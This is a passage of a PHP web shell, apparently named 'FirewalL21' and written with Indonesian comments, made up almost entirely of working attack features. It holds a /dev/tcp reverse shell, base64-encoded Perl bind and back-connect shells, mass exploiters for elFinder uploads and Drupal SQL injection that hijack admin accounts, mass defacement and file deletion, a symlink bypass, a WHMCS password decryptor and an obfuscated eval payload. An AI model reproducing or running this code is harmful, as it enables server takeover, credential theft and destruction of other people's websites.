    <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
    <input type='text' placeholder='port' name='port_bc' value='6969'><br>
    <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
    </form>";
    if(isset($_POST['sub_bc'])) {
        $ip = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
    }
    echo "</center>";
}
elseif ($_GET['do'] == 'elfinder') {
        echo "<div class='mybox'>";
        echo '<h1>elFinder Mass Exploiter</h1>';
        echo '<form method="post">
Target: <br>
<textarea name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="SIKAT!">
</form>';
        echo "</div>";
        function ngirim($url, $isi) {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
            $data3 = curl_exec($ch);
            return $data3;
        }
        $target = explode("
", $_POST['target']);
        if ($_POST['x']) {
            foreach ($target as $korban) {
                $nama_doang = "berandal.php";
                $isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
                $decode_isi = base64_decode($isi_nama_doang);
                $encode = base64_encode($nama_doang);
                $fp = fopen($nama_doang, "w");
                fputs($fp, $decode_isi);
                echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
                echo "# Upload[1] ......<br>";
                $url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
                $b = file_get_contents("$url_mkfile");
                $post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
                $post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
                $output_mkfile = ngirim("$korban", $post1);
                if (preg_match("/$nama_doang/", $output_mkfile)) {
                    echo "<font color='#FDF105'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                } else {
                    echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";
                    $upload_ah = ngirim("$korban?cmd=upload", $post2);
                    if (preg_match("/$nama_doang/", $upload_ah)) {
                        echo "<font color='#FDF105'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                    } else {
                        echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";
                    }
                }
            }
        }

    }
elseif($_GET['do'] == 'hashid') {
if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "Not Hash Entered";
    }
?>
    <center><br><Br><br>
    
        <form action="" method="POST">
        <tr>
        <table >
        <th colspan="5">Hash Identification</th>
        <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>  <td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
        <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
    </table></tr></form>
    </center>
<?php
}
elseif ($_GET['do'] == drupal) {
        echo "<div class='mybox'>
<h1>Drupal Mass Exploiter</h1><hr color='white'><br>
<form method='post' action=''>
<textarea rows='10'class='mybox' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
<input type='submit' class='kotak' style='border-color:white' name='submit' value='SIKAT!'>
</form>
</div>
";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
            $filename = $_FILES['file']['name'];
            $filetmp = $_FILES['file']['tmp_name'];
            echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
            move_uploaded_file($filetmp, $filename);
        }
        error_reporting(0);
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'berandal' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
                $ctx = stream_context_create($params);
                $data = file_get_contents($url . '/user/login/', null, $ctx);
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    $fp = fopen("exploited.txt", 'a+');
                    fwrite($fp, "Exploitied  User: berandal Pass: berandal  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='#FDF105'><b>Success:<font color='white'>FirewalL21</font> Pass:<font color='white'>FirewalL21</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
                } else {
                    echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
                }
            }
            $urls = explode("
", $_POST['url']);
            foreach ($urls as $url) {
                $url = @trim($url);
                echo exploit($url);
            }
        }

}
 elseif($_GET['do'] == 'backconnect') {
    echo "<form method='post'>
    <u>Bind Port:</u> <br>
    PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
    <input type='submit' name='sub_bp' value='>>'>
    </form>
    <form method='post'>
    <u>Back Connect:</u> <br>
    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
    PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
    <input type='submit' name='sub_bc' value='>>'>
    </form>";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if(isset($_POST['sub_bp'])) {
        $f_bp = fopen("/tmp/bp.pl", "w");
        fwrite($f_bp, base64_decode($bind_port_p));
        fclose($f_bp);

        $port = $_POST['port_bind'];
        $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
        unlink("/tmp/bp.pl");
    }
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    if(isset($_POST['sub_bc'])) {
        $f_bc = fopen("/tmp/bc.pl", "w");
        fwrite($f_bc, base64_decode($bind_connect_p));
        fclose($f_bc);

        $ipbc = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
        unlink("/tmp/bc.pl");
    }
}
 elseif($_GET['do'] == 'mass_deface') {
    echo "<center><form action=\"\" method=\"post\">\n";
    $dirr=$_POST['d_dir'];
    $index = $_POST["script"];
    $index = str_replace('"',"'",$index);
    $index = stripslashes($index);
    function edit_file($file,$index){
        if (is_writable($file)) {
        clear_fill($file,$index);
        echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
        } 
        else {
            echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
            }
            }
    function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    if(file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif($dirb === '..') {
                    if(file_exists("".dirname($dir)."/$namafile")) {
                        unlink("".dirname($dir)."/$namafile");
                    }
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=#FDF105>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
                                $idx = hapus_massal($dirc,$namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    function clear_fill($file,$index){
        if(file_exists($file)){
            $handle = fopen($file,'w');
            fwrite($handle,'');
            fwrite($handle,$index);
            fclose($handle);  } }

    function gass(){
        global $dirr , $index ;
        chdir($dirr);
        $me = str_replace(dirname(__FILE__).'/','',__FILE__);
        $files = scandir($dirr) ;
        $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
        sort($files);
        $n = 0 ;
        foreach ($files as $file){
            if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
                echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
                edit_file($file,$index);
                flush();
                $n = $n +1 ;
                } 
                }
                echo "<br>";
                echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
                    }
    function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
            }

            closedir($dh);
            return $files;
        }
    }
    function gass_all(){
        global $index ;
        $dirrall=$_POST['d_dir'];
        foreach (ListFiles($dirrall) as $key=>$file){
            $file = str_replace('//',"/",$file);
            echo "<center><strong>$file</strong> ===>";
            edit_file($file,$index);
            flush();
        }
        $key = $key+1;
    echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=#FDF105>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['mass'] == 'onedir') {
        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
        $ini="http://";
        $mainpath=$_POST[d_dir];
        $file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){
        $start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){
            echo"$ini$row/$file\n";
            }
        }
        echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
        $mainpath=$_POST[d_dir];$file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
        }

    }
    elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
    elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
    elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
    elseif($_POST['mass'] == 'massdeface') {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        echo "</div>";  }
    else {
        echo "
        <center><font style='text-decoration: underline;'>
        Select Type:<br>
        </font>
        <select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"onedir\">Mass Deface 1 Dir</option>
        <option value=\"massdeface\">Mass Deface ALL Dir</option>
        <option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
        <option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
        <option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
        <font style='text-decoration: underline;'>Folder:</font><br>
        <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
        <font style='text-decoration: underline;'>Filename:</font><br>
        <input type='text' name='d_file' value='69.php' style='width: 450px;' height='10'><br>
        <font style='text-decoration: underline;'>Index File:</font><br>
        <textarea name='script' style='width: 450px; height: 200px;'>Hacked By FirewalL21</textarea><br>
        <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
        </form></center>";
        }
    }
    elseif($_GET['do'] == 'vhost') {
    echo "<form method='POST' action=''>";
    echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
    echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
        if (isset($_POST['Colii'])){ system('ln -s / FirewalL21.txt');
            $fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
            $file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","FirewalL21.txt");
            $rt="<br><a href=FirewalL21.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
    Bypassed Successfully</b></font></a>";
    echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'whmcsdecod'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;do=whmcs" method="post">

<?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br><center><font size='5' color='#FFFFFF'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FFFFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FFFFFF;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
elseif($_GET['do'] == 'zip') {
    echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
    $filename = $_FILES["zip_file"]["name"];
    $source = $_FILES["zip_file"]["tmp_name"];
    $type = $_FILES["zip_file"]["type"];
    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
        if($mime_type == $type) {
            $okay = true;
            break;
        } 
    }
    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
        $message = "Itu Bukan Zip  , , BODOH KAU";
    }
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
    if(move_uploaded_file($source, $targetzip)) {
        $zip = new ZipArchive();
        $x = $zip->open($targetzip); 
        if ($x === true) {
            $zip->extractTo($targetdir);
            $zip->close();
 
            unlink($targetzip);
        }
        $message = "<b>Sukses Bro :)</b>";
    } else {    
        $message = "<b>Error Bro :(</b>";
    }
}   
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/act_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";   
    if($_POST['backup']){ 
    $save=$_POST['save'];
    function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
    Zip($_POST['dir'],$save);
    echo "Done , Save To <b>$save</b>";
    }
    echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/act_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
    if($_POST['extrak']){
    $save=$_POST['save'];
    $zip = new ZipArchive;
    $res = $zip->open($_POST['dir']);
    if ($res === TRUE) {
        $zip->extractTo($save);
        $zip->close();
    echo 'Succes , Location : <b>'.$save.'</b>';
    } else {
    echo 'Gagal Bro :( kurang beramal !';
    }
    }
echo '</tr></table>';   
    }
    elseif($_GET['do'] == 'shellchk') {
        eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWmWpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl+381rjEL1whj5xmh/kwvC85oifDTp6wqlXyADr2ynAJKJgpiEaeTrCvLaDIA/J0OCD47FswS6Yi85pEzzrYVoNF2ujEg0OX0jJ1duvpWlW+hORmhxQIElNvPuS/inBksxEA98JsNaPjRIiU9civj2FpYL5jhElwWdN8KmUSZ3fm5NNn2pVFMWILSHUuPTFerhbfSYs1Xax+nV2s4u+Xl4slegNI6MckWBxvdmiUx6SRWHUftOXZ5jWmD/Gi9qAUbdMVvKPKP6elKVxA1QayIrWnG3A59y6ibiMjrDMd9OI+9UfcyU9QsvB3W5VwT4eDHam5xc85F8ACd40q3EvfeMxADe3HzatgAcLD58AhwYNoyOxJDvqc5pYhhrOHCO8Y097nXM6vJACLfvCEct6IWaMfGxj5VXOGSwk5Opai4J5n72gj0Wfza+sM+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7dA7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd+yU4Q6botthiDsI//AU='))))));
    } elseif($_GET['do'] == 'loghunter')
